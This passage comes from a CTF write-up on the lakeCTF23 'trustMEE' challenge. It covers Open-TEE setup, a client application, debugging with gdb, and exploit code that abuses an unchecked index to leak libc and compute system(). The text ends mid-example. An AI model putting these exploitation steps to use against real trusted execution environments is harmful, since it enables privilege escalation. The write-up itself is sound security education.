+</span></span></code></pre></div><p>We first build the docker image with the command <code>docker build -t trustmee .</code>. Then, we can run the image with the command <code>docker run -v ./solution:/home/ctf/solution --cap-add=SYS_PTRACE --rm -it --name trustmee_1 trustmee</code>. Running the image should produce no output and the terminal should seem like &ldquo;hanging&rdquo;, since <code>tail -f /dev/null</code> is the last command executed by the docker&rsquo;s entrypoint. Attaching a volume makes CA development also easier.</p><p>Next, in a new terminal, we can attach to the challenge using <code>docker exec -it -u root trustmee_1 /bin/bash</code>. Here is how the environment looks like:</p><p><img src=/post-resources/TrustMEE/challenge-running.png alt=challenge-running.png></p><h3 id=51-creating-a-client-application-ca>5.1 Creating a Client Application (CA)</h3><p>In this challenge, we are given a starting point as we are provided with a minimal client application (<a href=https://github.com/nikosChalk/ctf-writeups/blob/master/lakeCTF23/pwn/trustMEE/resources/grade_ca.c target=_blank rel="noopener noreferrer">grade_ca.c</a>) shown below. However, even without this starting point, we already learnt enough to be able to build it on our own 🙃</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// grade_ca.c
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;tee_client_api.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;grade_ca.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> TEEC_UUID uuid <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x11223344</span>, <span style=color:#ae81ff>0xA710</span>, <span style=color:#ae81ff>0x469E</span>, { <span style=color:#ae81ff>0xAC</span>, <span style=color:#ae81ff>0xC8</span>, <span style=color:#ae81ff>0x5E</span>, <span style=color:#ae81ff>0xDF</span>, <span style=color:#ae81ff>0x8C</span>, <span style=color:#ae81ff>0x85</span>, <span style=color:#ae81ff>0x90</span>, <span style=color:#ae81ff>0xE1</span> }
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>  TEEC_Context context;
+</span></span><span style=display:flex><span>  TEEC_Session session;
+</span></span><span style=display:flex><span>  TEEC_Operation operation;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory in_mem;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory out_mem;
+</span></span><span style=display:flex><span>  TEEC_Result tee_rv;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>in_mem, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(in_mem));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>operation, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(operation));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Initializing context: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InitializeContext</span>(NULL, <span style=color:#f92672>&amp;</span>context);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InitializeContext failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;initialized</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// Connect to the TA
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Openning session: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_OpenSession</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>session, <span style=color:#f92672>&amp;</span>uuid, TEEC_LOGIN_PUBLIC, NULL, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_OpenSession failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;opened</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// Setup memory for the input/output classes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> studentclass<span style=color:#f92672>*</span> StudentClassInst <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> studentclass<span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> studentclass)); 
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> signedStudentclass<span style=color:#f92672>*</span> signedStudentClassInst <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> signedStudentclass<span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> signedStudentclass)); 
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(StudentClassInst, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> studentclass));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(signedStudentClassInst, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> signedStudentclass));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  StudentClassInst<span style=color:#f92672>-&gt;</span>students[<span style=color:#ae81ff>0</span>].grade <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(StudentClassInst<span style=color:#f92672>-&gt;</span>students[<span style=color:#ae81ff>0</span>].firstname, <span style=color:#e6db74>&#39;A&#39;</span>, NAME_LEN<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(StudentClassInst<span style=color:#f92672>-&gt;</span>students[<span style=color:#ae81ff>0</span>].lastname, <span style=color:#e6db74>&#39;B&#39;</span>, NAME_LEN<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  in_mem.buffer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)StudentClassInst;
+</span></span><span style=display:flex><span>  in_mem.size <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> studentclass);
+</span></span><span style=display:flex><span>  in_mem.flags <span style=color:#f92672>=</span> TEEC_MEM_INPUT;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// Register shared memory, allows us to read data from TEE or read data from it
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_RegisterSharedMemory</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>in_mem);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to register studentclass shared memory</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;registered shared memory for student class</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  out_mem.buffer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)signedStudentClassInst;
+</span></span><span style=display:flex><span>  out_mem.size <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> signedStudentclass);
+</span></span><span style=display:flex><span>  out_mem.flags <span style=color:#f92672>=</span> TEEC_MEM_OUTPUT;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_RegisterSharedMemory</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>out_mem);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to register signed studentclass memory</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  @TODO: Implement actual logic to sign student grades.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The missing part here is how to compile it. We make a simple <a href=https://github.com/nikosChalk/ctf-writeups/blob/master/lakeCTF23/pwn/trustMEE/solution/Makefile target=_blank rel="noopener noreferrer">Makefile</a> for it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-makefile data-lang=makefile><span style=display:flex><span>OPEN_TEE_PATH<span style=color:#f92672>=</span>/opt/OpenTee
+</span></span><span style=display:flex><span>CFLAGS <span style=color:#f92672>+=</span> -g -Wall -I/home/ctf/opentee/libtee/include -I./
+</span></span><span style=display:flex><span>LDADD <span style=color:#f92672>+=</span> -L<span style=color:#66d9ef>$(</span>OPEN_TEE_PATH<span style=color:#66d9ef>)</span>/lib/ -ltee
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>.PHONY</span><span style=color:#f92672>:</span> all
+</span></span><span style=display:flex><span><span style=color:#a6e22e>all</span><span style=color:#f92672>:</span> grade_ca
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>grade_ca</span><span style=color:#f92672>:</span> grade_ca.c grade_ca.h
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>$(</span>CC<span style=color:#66d9ef>)</span> <span style=color:#66d9ef>$(</span>CFLAGS<span style=color:#66d9ef>)</span> -o $@ $^ <span style=color:#66d9ef>$(</span>LDADD<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>.PHONY</span><span style=color:#f92672>:</span> clean
+</span></span><span style=display:flex><span><span style=color:#a6e22e>clean</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>	rm -f *.o grade_ca
+</span></span></code></pre></div><p><img src=/post-resources/TrustMEE/ta-running.png alt=ta-running></p><h3 id=52-debugging>5.2 Debugging</h3><p>Let&rsquo;s close the environment setup chapter by talking about debugging.</p><p>If we want to debug our Client Application, the process is the same as with any other C program that we write. The CA does not differ to any regular application as it is running in the REE. If we want to debug the TA, we attach to the docker container with the <code>root</code> user (<code>docker exec -it -u root trustmee_1 /bin/bash</code>). There are two ways to debug TAs:</p><h4 id=521-debugging-from-the-very-beginning>5.2.1 Debugging from the very beginning</h4><p>In this method we want to attach to the TA from the very beginning, including being able to debug the <code>TA_CreateEntryPoint</code>, i.e. instance creation. To do so, we will attach gdb to the Open-TEE framework. New TA instances are spawned as new processes and run in an endless loop awaiting for Tasks (i.e. commands). Here is how it is done internally in Open-TEE:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>lib_main_loop</span>(<span style=color:#66d9ef>struct</span> core_control <span style=color:#f92672>*</span>ctl_params)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    new_proc_pid <span style=color:#f92672>=</span> <span style=color:#a6e22e>clone</span>(ta_process_loop, child_stack <span style=color:#f92672>+</span> CHILD_STACK_SIZE, SIGCHLD <span style=color:#f92672>|</span> CLONE_PARENT, <span style=color:#f92672>&amp;</span>ta_loop_args);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>ta_process_loop</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>arg) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>load_ta</span>(path, <span style=color:#f92672>&amp;</span>interface); <span style=color:#75715e>//Will perform dlopen() and bring the TA into memory
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>pthread_attr_setdetachstate</span>(<span style=color:#f92672>&amp;</span>attr, PTHREAD_CREATE_DETACHED);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pthread_create</span>(<span style=color:#f92672>&amp;</span>ta_logic_thread, <span style=color:#f92672>&amp;</span>attr, ta_internal_thread, open_msg);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>ta_internal_thread</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>arg) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (;;) {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//Wait for Tasks
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//Execute Tasks (e.g. open a session, invoke command, etc.)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//Repeat
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span></code></pre></div><p>So, we will spawn gdb with the command <code>gdb /opt/OpenTee/bin/opentee-engine `pgrep -f tee_launcher` </code>. Next, we will use the following gdb commands:</p><pre tabindex=0><code class=language-gdb data-lang=gdb>set follow-fork-mode child
+b ta_internal_thread
+command
+  b TA_CreateEntryPoint
+end
+continue
+</code></pre><p>Afterwards, using our client application, we can load the TA and debug it from the very beginning.</p><h4 id=522-attaching-a-debugger-to-a-ta-instance>5.2.2 Attaching a debugger to a TA instance</h4><p>In this case, a TA instance already exists and we want to attach to it. The TA is shown when we run <code>ps aux</code> as a process named <code>grade_ta.so</code>. We simply attach to it via gdb and debugging is possible immediately: <code>gdb /opt/OpenTee/bin/opentee-engine `pgrep -f grade_ta.so`</code></p><h2 id=6-identifying-an-exploitation-strategy>6. Identifying an exploitation strategy</h2><p>On the machine running this challenge we have userspace access. The flag is located at <code>/opt/OpenTee/flag.txt</code> and belongs to the <code>root</code> user with all permissions removed:</p><pre tabindex=0><code class=language-log data-lang=log>ctf@42ac3fd4b5ef:/home/ctf/solution$ ls -l /opt/OpenTee/flag.txt
+---------- 1 root root 44 Dec 28 21:17 /opt/OpenTee/flag.txt
+ctf@42ac3fd4b5ef:/home/ctf/solution$ cat /opt/OpenTee/flag.txt
+cat: /opt/OpenTee/flag.txt: Permission denied
+</code></pre><p>As we run as the <code>ctf</code> user, we cannot access the flag. Our goal will be to exploit the TA and do a <code>chmod 777 /opt/OpenTee/flag.txt</code> so that later we can dump the flag with <code>cat /opt/OpenTee/flag.txt</code>. It is worth noting that the TA does not produce any output logs and its <code>stdin</code>/<code>stderr</code>/<code>stdout</code> are redirected to <code>/dev/null</code>:</p><p><img src=/post-resources/TrustMEE/no-output.png alt="no TA output"></p><h2 id=7-writing-the-exploit>7. Writing the exploit</h2><p>Here is a reminder of the bugs that are in-place:</p><ol><li>The first major bug is that no TA command checks the type of arguments and their direction. This is really bad as type confusion is possible in all commands.</li><li>In <code>SIGN_CLASS</code>, the size is not checked correctly. The line <code>end = curSignedStudent + NR_STUDENTS</code> means that the given memory reference is always assumed to contain <code>NR_STUDENTS*sizeof(struct student)</code> bytes.</li><li>In <code>SIGN_CLASS_STUDENT</code>, there is no bounds checking on the index. This leads to an arbitrary read.</li></ol><h3 id=71-libcso-leak>7.1 <code>libc.so</code> leak</h3><p>We will start with 3. — the arbitrary read:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/* SIGN_CLASS_STUDENT */</span>
+</span></span><span style=display:flex><span>studentArray <span style=color:#f92672>=</span> (student <span style=color:#f92672>*</span>)(params<span style=color:#f92672>-&gt;</span>memref).buffer;
+</span></span><span style=display:flex><span>curSignedStudent <span style=color:#f92672>=</span> (signedStudent <span style=color:#f92672>*</span>)params[<span style=color:#ae81ff>1</span>].memref.buffer;
+</span></span><span style=display:flex><span>idx <span style=color:#f92672>=</span> params[<span style=color:#ae81ff>2</span>].value.a;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(<span style=color:#ae81ff>5</span>,studentArray,params[<span style=color:#ae81ff>0</span>].memref.size) <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(<span style=color:#ae81ff>5</span>,curSignedStudent, params[<span style=color:#ae81ff>1</span>].memref.size) <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>  student1 <span style=color:#f92672>=</span> studentArray <span style=color:#f92672>+</span> (<span style=color:#66d9ef>int</span>)idx;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent,student1,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent<span style=color:#f92672>-&gt;</span>lastname,student1<span style=color:#f92672>-&gt;</span>lastname,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>  curSignedStudent<span style=color:#f92672>-&gt;</span>grade <span style=color:#f92672>=</span> student1<span style=color:#f92672>-&gt;</span>grade;
+</span></span><span style=display:flex><span>  curSignedStudent<span style=color:#f92672>-&gt;</span>sciper <span style=color:#f92672>=</span> student1<span style=color:#f92672>-&gt;</span>sciper;
+</span></span><span style=display:flex><span>  TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calculate_signature</span>(sessionContext,curSignedStudent);
+</span></span><span style=display:flex><span>} }
+</span></span></code></pre></div><p>As you can see, we can use any <code>idx</code> and make <code>student1</code> point anywhere in memory. The buffer <code>curSignedStudent</code> is a Shared Memory block that we supply with type <code>TEEC_MEM_OUTPUT</code>. So, with a single <code>SIGN_CLASS_STUDENT</code> command we can leak <code>0x28</code> bytes (excluding the random signature). We will use this primitive to find the base address of libc. To do so, we will initially use <code>idx=0</code> and insert a breakpoint at <code>TEE_MemMove(curSignedStudent,student1,0x10)</code>:</p><p><img src=/post-resources/TrustMEE/breakpoint-leak.png alt=breakpoint-leak.png></p><p><code>$rsi=0x7fc3132b2000</code> is the address of our Shared Memory block and belongs to the <code>/dev/shm/5203tttttttttt972022484tttttt1704030777tttt</code> VMA. A little further below is the <code>rw-</code> page of <code>ld.so</code>. We will search that page, as it is the nearset one, for pointers in order to leak libc:</p><p><img src=/post-resources/TrustMEE/libc-leak.png alt=libc-leak.png></p><p>Perfect! We find a libc leak at <code>$rsi+0x3000+0x18</code>, which corresponds to the symbol <code>_dl_catch_exception</code>. With some arithmetic, we find out that this symbol is located at libc offset <code>0x174820</code>. So, if we leak this pointer (<code>_dl_catch_exception=0x7fc3131c0820</code>) we can find the base address of libc!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>operation, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(operation));
+</span></span><span style=display:flex><span>operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(
+</span></span><span style=display:flex><span>  TEEC_MEMREF_WHOLE,
+</span></span><span style=display:flex><span>  TEEC_MEMREF_WHOLE,
+</span></span><span style=display:flex><span>  TEEC_VALUE_INPUT,
+</span></span><span style=display:flex><span>  TEEC_NONE
+</span></span><span style=display:flex><span>);
+</span></span><span style=display:flex><span>operation.params[<span style=color:#ae81ff>0</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>in_mem;
+</span></span><span style=display:flex><span>operation.params[<span style=color:#ae81ff>1</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>out_mem;
+</span></span><span style=display:flex><span><span style=color:#75715e>// Byte offset 0x3018 translates to :
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//  0x3018/sizeof(struct student)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// =0x3018/0x28
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// =307=0x133 offset of a `struct student` array.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>operation.params[<span style=color:#ae81ff>2</span>].value.a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x133</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invoking command SIGN_CLASS_STUDENT: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InvokeCommand</span>(<span style=color:#f92672>&amp;</span>session, SIGN_CLASS_STUDENT, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS <span style=color:#f92672>&amp;&amp;</span> tee_rv <span style=color:#f92672>!=</span> TEEC_ERROR_SECURITY) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InvokeCommand failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>exit</span>(tee_rv);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;res: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>DumpHex</span>(out_mem.buffer, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> signedStudent));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint64_t</span> libc_leak <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)out_mem.buffer<span style=color:#f92672>+</span><span style=color:#ae81ff>0x20</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint64_t</span> libc_base <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x174820</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint64_t</span> libc_system <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50d70</span>;
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found libc base: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, libc_base);
+</span></span></code></pre></div><p><img src=/post-resources/TrustMEE/libc-leak-poc.png alt=libc-leak-poc.png></p><h3 id=72-grade_taso-leak>7.2 <code>grade_ta.so</code> leak</h3><p>Perfect, we have leaked libc! How about the base address of <code>grade_ta.so</code>? We will rely on mmap relativity. When pages are mmaped, the base address of where mmaped pages are allowed to live is the only thing randomized (<code>mmap_base</code>). However, subsequent mmap calls return an address relative to the <code>mmap_base</code>. Here is a very simply demonstration of mmap relativity:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define ABS_DIFF(x,y) ( (x) &gt; (y) ? ( (x)-(y) ) : ( (y)-(x) ) )
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>addr1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>mmap</span>(NULL, <span style=color:#ae81ff>4096</span>, PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>addr2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>mmap</span>(NULL, <span style=color:#ae81ff>4096</span>, PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
